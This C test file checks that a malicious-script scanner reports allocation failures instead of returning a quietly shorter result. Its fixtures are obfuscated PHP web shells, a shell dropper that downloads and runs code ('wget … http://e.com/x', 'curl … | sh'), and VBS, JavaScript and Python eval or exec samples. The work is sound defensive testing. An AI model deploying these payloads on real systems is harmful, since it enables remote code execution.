/*
 * genome / diag_text_oom - G9: an allocation that fails inside the TEXT route must never turn into a shorter graph with a clean status.
 *
 * The invariant is the one rule 4 states for a limit, applied to memory: when what a scan returns differs from what it returns with every allocation granted, its status says so
 * (KGENOME_NOMEM, or the over-budget the ledger gives). It is checked the only way that does not depend on knowing which allocation matters: for each program of a set, every
 * allocation the scan makes is refused in turn (malloc, calloc and realloc are wrapped, UNIT_LIBS_diag_text_oom), and the graph - the capabilities in order and the links by index - is
 * compared with the unrefused one. A scan that comes back NULL says it itself (the caller's `refused`), and one that crashes is not an answer.
 *
 * What is wrapped is armed only around the scan, so the harness's own allocations (printf's buffer) are never refused.
 *
 * usage: diag_text_oom
 */

#include <execinfo.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <phenotype/diag_scan.h>

static int fails;

#define CK(c, ...) do { if (!(c)) { printf("  FAIL %s:%d  ", __FILE__, __LINE__); printf(__VA_ARGS__); printf("\n"); fails++; } } while (0)

void *__real_malloc(size_t n);
void *__real_calloc(size_t a, size_t b);
void *__real_realloc(void *p, size_t n);
void *__wrap_malloc(size_t n);
void *__wrap_calloc(size_t a, size_t b);
void *__wrap_realloc(void *p, size_t n);

static long armed, seen, fail_at;
static void *where[16];
static int nwhere;

static int refuse(void)
{
	if (!armed)
		return 0;
	if (++seen != fail_at)
		return 0;
	nwhere = backtrace(where, 16);
	return 1;
}

void *__wrap_malloc(size_t n)
{
	return refuse() ? NULL : __real_malloc(n);
}

void *__wrap_calloc(size_t a, size_t b)
{
	return refuse() ? NULL : __real_calloc(a, b);
}

void *__wrap_realloc(void *p, size_t n)
{
	return refuse() ? NULL : __real_realloc(p, n);
}

static int app(void *u, const struct kgenome_textual_call *c, const uint8_t *in, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *n)
{
	(void)u; (void)c; (void)in; (void)len; (void)out; (void)cap; (void)n;
	return 0;
}

static void on_const_nop(void *u, uint64_t off, uint64_t len, const uint8_t *v, uint32_t n)
{
	(void)u; (void)off; (void)len; (void)v; (void)n;
}

/* The graph as text: capabilities in order, links by index with role and kind. */
static void sig_of(const struct kgenome_diag_scan *s, char *out, size_t cap)
{
	uint32_t i, k;
	size_t n = 0;

	out[0] = 0;
	for (i = 0; i < kgenome_diag_scan_count(s) && n + 80u < cap; i++) {
		const struct kgenome_diag_hit *h = kgenome_diag_scan_at(s, i);

		n += (size_t)snprintf(out + n, cap - n, "%u:%u[", i, (unsigned)h->cap);
		for (k = 0; k < h->n_in; k++)
			n += (size_t)snprintf(out + n, cap - n, "%u/%u/%u ", (unsigned)h->in[k].from, (unsigned)h->in[k].role, (unsigned)h->in[k].kind);
		n += (size_t)snprintf(out + n, cap - n, "]");
	}
}

struct prog {
	const char *name;
	uint32_t    lang;
	int         consts;
	const char *text;
};

static char deep[4096];

static struct prog P[] = {
	{ "php loader", KGENOME_TEXTUAL_LANG_PHP, 1,
	  "<?php function x($t){ return gzuncompress(base64_decode($t)); }\n$f=str_replace('k','','ckrekatek_fuknkkction'); $s=$f('',$_POST[0]); $s();\neval(x($_POST[1]));\n"
	  "$n='sys'.'tem'; $n($_GET[2]); $a1='system'; $a2=$a1; $a2($_GET[3]); $c=array('base64_decode'); $d=$c[0]($_GET[4]); eval($d);\n" },
	{ "php layers", KGENOME_TEXTUAL_LANG_PHP, 0, "<?php eval('eval(\\'system($_GET[0]);\\');'); $v = 'a'; $v .= 'b'; $v .= 'c'; $v .= 'd'; $v .= 'e'; $v .= 'f'; $v .= 'g'; $v($_GET[1]);\n" },
	{ "php deep", KGENOME_TEXTUAL_LANG_PHP, 0, deep },
	{ "php scopes", KGENOME_TEXTUAL_LANG_PHP, 0,
	  "<?php $x = $_GET[0]; function f($a, $b){ global $x; return g($b); } function g($c){ system($c); return $c; } function h(){ function i(){ eval($x); } }\nsystem(f($_POST[0], $_POST[1]));\n" },
	{ "sh dropper", KGENOME_TEXTUAL_LANG_SH, 1,
	  "#!/bin/sh\nx=/tmp/a\ny=ev\nz=al\nwget -O $x http://e.com/x\nchmod +x $x\nsh $x\n$y$z \"$(echo hi | base64 -d)\"\ncurl http://e.com/p | sh\n" },
	{ "js arrows", KGENOME_TEXTUAL_LANG_JS, 1,
	  "var a = atob(s); var f = 'ev' + 'al'; window[f](a); var g = (x) => { return eval(x); }; g(a); function h(p) { return p; } eval(h(a));\n" },
	{ "vbs dim", KGENOME_TEXTUAL_LANG_VBS, 1,
	  "a = Request(\"x\")\r\nFunction f(b)\r\nDim c, d\r\nc = b\r\nCreateObject(\"WScript.Shell\").Run c\r\nf = c\r\nEnd Function\r\nExecute f(a)\r\n" },
	{ "python", KGENOME_TEXTUAL_LANG_PY, 1,
	  "import os, base64\nd = base64.b64decode(s)\ndef run(cmd):\n    os.system(cmd)\nrun(d)\nexec(d)\n" },
};

static void deep_text(void)
{
	size_t n = 0;
	int k;

	n += (size_t)snprintf(deep + n, sizeof deep - n, "<?php system(");
	for (k = 0; k < 40; k++)
		n += (size_t)snprintf(deep + n, sizeof deep - n, "strtolower(");
	n += (size_t)snprintf(deep + n, sizeof deep - n, "$_GET[0]");
	for (k = 0; k < 40; k++)
		deep[n++] = ')';
	snprintf(deep + n, sizeof deep - n, "); eval(strrev($_GET[1]));");
}

static struct kgenome_diag_scan *scan(const struct prog *p, enum kgenome_status *refused)
{
	struct kgenome_diag_text_req rq = { .base = (const uint8_t *)p->text, .size = strlen(p->text), .lang = p->lang, .apply = app, .refused = refused };

	if (p->consts)
		rq.on_const = on_const_nop;
	return kgenome_diag_scan_text(&rq);
}

int main(void)
{
	size_t i;
	long total_refusals = 0, silent = 0;

	deep_text();
	for (i = 0; i < sizeof P / sizeof P[0]; i++) {
		char base[4096], got[4096];
		struct kgenome_diag_scan *s;
		enum kgenome_status rf = KGENOME_OK;
		long allocs, k;

		armed = 1;
		seen = 0;
		fail_at = 0;
		s = scan(&P[i], &rf);
		armed = 0;
		allocs = seen;
		CK(s != NULL, "%s: the unrefused scan", P[i].name);
		if (!s)
			continue;
		sig_of(s, base, sizeof base);
		CK(kgenome_diag_scan_count(s) != 0, "%s: the program makes nodes", P[i].name);
		kgenome_diag_scan_free(s);
		for (k = 1; k <= allocs; k++) {
			enum kgenome_status st;

			nwhere = 0;
			rf = KGENOME_OK;
			armed = 1;
			seen = 0;
			fail_at = k;
			s = scan(&P[i], &rf);
			armed = 0;
			fail_at = 0;
			total_refusals++;
			if (!s)
				continue;                       /* no scan: the caller is told by its own return */
			sig_of(s, got, sizeof got);
			st = kgenome_diag_scan_status(s);
			if (strcmp(got, base) != 0 && st == KGENOME_OK) {
				silent++;
				CK(0, "G9 %s: refusing allocation %ld of %ld made a different graph and the status is ok  [%s] against [%s]", P[i].name, k, allocs, got, base);
				if (nwhere)
					backtrace_symbols_fd(where, nwhere, 1);
			}
			kgenome_diag_scan_free(s);
		}
	}
	printf("diag_text_oom: %ld allocations refused in turn over %zu programs, %ld silent\n", total_refusals, sizeof P / sizeof P[0], silent);
	if (fails) {
		printf("diag_text_oom: %d failure(s)\n", fails);
		return 1;
	}
	printf("diag_text_oom: ok\n");
	return 0;
}
